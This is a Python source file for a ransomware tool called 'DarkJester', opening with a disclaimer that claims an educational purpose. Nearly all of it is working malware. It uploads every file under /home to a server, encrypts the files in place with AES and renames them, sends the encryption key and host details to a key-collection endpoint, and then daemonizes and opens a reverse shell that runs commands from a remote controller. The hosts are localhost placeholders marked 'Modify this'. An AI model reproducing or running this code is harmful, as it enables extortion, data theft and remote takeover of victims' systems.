"""
________                __        ____.                __                
\______ \ _____ _______|  | __   |    | ____   _______/  |_  ___________ 
 |    |  \\__  \\_  __ \  |/ /   |    |/ __ \ /  ___/\   __\/ __ \_  __ \
 |    `   \/ __ \|  | \/    </\__|    \  ___/ \___ \  |  | \  ___/|  | \/
/_______  (____  /__|  |__|_ \________|\___  >____  > |__|  \___  >__|   
        \/     \/           \/             \/     \/            \/       
Disclaimer: DarkJester is a powerful ransomware tool developed for educational and research purposes only. 
Unauthorized use of this software is strictly illegal and may result in criminal prosecution. 
Running or deploying DarkJester on any system without explicit permission from the system owner constitutes a violation of cybersecurity laws. 
This tool is intended solely for demonstrating security flaws and testing defenses in controlled environments. 
Always act responsibly and ethically when working with this kind tool.
"""
import os
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import base64
import requests
import socket
import threading
import subprocess as sp
import platform
import pwd
from concurrent.futures import ThreadPoolExecutor
import re
import pty
import time

class DarkJester:
    def __init__(self, key_size=32, iv_size=16):
        self.key = get_random_bytes(key_size)
        self.iv = get_random_bytes(iv_size)

    def exfiltrate_file(self, filepath, server_url):
        try:
            with open(filepath, 'rb') as file:
                file_data = file.read()
                filename = os.path.basename(filepath)
                files = {'file': (filename, file_data)}
                response = requests.post(server_url, files=files)
                if response.status_code == 200:
                    print(f"[+] File {filename} exfiltrated successfully.")
                else:
                    print(f"[-] Failed to exfiltrate {filename}. Status code: {response.status_code}")
        except Exception as e:
            print(f"[-] Error exfiltrating {filepath}: {e}")

    def encrypt_file(self, filepath, server_url):
        try:
            if os.path.basename(filepath) in ["darkjester_encryptor_mass_linux.py", "darkjester_encryptor_mass_linux", "darkjester_encryptor_specific_linux.py", "darkjester_encryptor_specific_linux", "PLEASE_READ_ME.txt", "darkjester_decryptor_mass_linux.py", "darkjester_decryptor_mass_linux", "darkjester_decryptor_specific_linux.py", "darkjester_decryptor_testing_linux"]:
                return
            if filepath.endswith('.a1sberg'):
                return
            self.exfiltrate_file(filepath, server_url)
            cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
            with open(filepath, 'rb') as src:
                padded_data = pad(src.read(), AES.block_size)
            with open(filepath, 'wb') as dst:
                dst.write(self.iv + cipher.encrypt(padded_data))
            new_filepath = f"{filepath}.a1sberg"
            os.rename(filepath, new_filepath)
            print(f"Encrypted: {filepath}")
        except (PermissionError, OSError) as e:
            print(f"Error encrypting {filepath}: {e}")

    def encrypt_directory(self, directory, server_url, max_threads=10):
        with ThreadPoolExecutor(max_threads) as executor:
            for root, _, files in os.walk(directory):
                for file in files:
                    filepath = os.path.join(root, file)
                    executor.submit(self.encrypt_file, filepath, server_url)
    
    def get_mac_address(self):
        result = sp.run(['ip', 'addr'], capture_output=True, text=True)
        lines = result.stdout.splitlines()
        for line in reversed(lines):
            if "link/ether" in line:
                mac_address = line.split()[1]
                return mac_address
        return "N/A"

    def get_public_ip(self):
        try:
            return requests.get('https://api.ipify.org').text.strip()
        except requests.RequestException as e:
            return "N/A"

    def get_system_info(self):
        try:
            os_name = platform.system()
            hostname = socket.gethostname()
            user = pwd.getpwuid(os.getuid())[0]
            architecture = os.uname()[4]
            mac_address = self.get_mac_address()
            external_ip = self.get_public_ip()
            return {
                "Operating System": os_name,
                "Hostname": hostname,
                "User": user,
                "Architecture": architecture,
                "MAC Address": mac_address,
                "External IP": external_ip
            }
        except Exception as e:
            pass

    def exfiltrate_key(self, server_url):
        encoded_key = base64.b64encode(self.key).decode()
        system_info = self.get_system_info()
        payload = {
            "key": encoded_key,
            "system_info": system_info
        }
        try:
            requests.post(server_url, json=payload, headers={'Content-Type': 'application/json'})
        except requests.RequestException as e:
            print(f"Error exfiltrating key: {e}")

class C2_Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.reconnect_interval = 5
        self.current_dir = os.getcwd()
        self.command_delimiter = "<START>"
        self.response_delimiter = "<END>"

    def daemonize(self):
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except OSError as e:
            sys.exit(1)
        os.chdir("/")
        os.setsid()
        os.umask(0)
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except OSError as e:
            sys.exit(1)
        sys.stdout.flush()
        sys.stderr.flush()
        with open("/dev/null", 'r') as null_file:
            os.dup2(null_file.fileno(), sys.stdin.fileno())
        with open("/dev/null", 'a+') as null_file:
            os.dup2(null_file.fileno(), sys.stdout.fileno())
            os.dup2(null_file.fileno(), sys.stderr.fileno())

    def connect_to_server(self):
        while True:
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                client.connect((self.host, self.port))
                return client
            except Exception as e:
                print(f"Connection failed: {e}")
                time.sleep(self.reconnect_interval)

    def execute_command(self, command):
        try:
            command = command.strip()
            if command.lower() == 'cd':
                return self.current_dir
            elif command.lower().startswith('cd '):
                new_dir = command[3:].strip()
                try:
                    target_dir = os.path.abspath(os.path.join(self.current_dir, new_dir))
                    if os.path.isdir(target_dir):
                        os.chdir(target_dir)
                        self.current_dir = target_dir
                        return f"[*] Changed directory to {self.current_dir}"
                    else:
                        return f"[*] Error: Directory '{new_dir}' does not exist"
                except Exception as e:
                    return f"[*] Error changing directory: {e}"
            else:
                result = sp.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=10,
                    cwd=self.current_dir
                )
                output = result.stdout + result.stderr
                return output if output else "[*] Command executed"
        except Exception as e:
            return f"[*] Error executing command: {e}"

    def start(self):
        self.add_to_registry()
        while True:
            client = self.connect_to_server()
            try:
                while True:
                    command = ""
                    while True:
                        data = client.recv(1024).decode('utf-8', errors='ignore')
                        if not data:
                            raise Exception("Client disconnected")
                        command += data
                        if self.command_delimiter in command:
                            command = command.split(self.command_delimiter)[1].strip()
                            break
                    if command.lower() == 'exit':
                        break
                    result = self.execute_command(command)
                    response = f"{result}\n{self.response_delimiter}"
                    client.send(response.encode('utf-8'))
            except Exception as e:
                print(f"Connection lost: {e}")
            finally:
                client.close()
                time.sleep(self.reconnect_interval)

if __name__ == "__main__":
    jester = DarkJester()
    shell = C2_Server('127.0.0.1', 1234) # Modify this
    server_url = "http://127.0.0.1:5000/upload" # Modify this
    shell.daemonize()
    user_directory = "/home"
    if os.path.exists(user_directory):
        jester.encrypt_directory(user_directory, server_url, max_threads=30)
    jester.exfiltrate_key("http://127.0.0.1:5000/store-key") # Modify this
    shell.start()
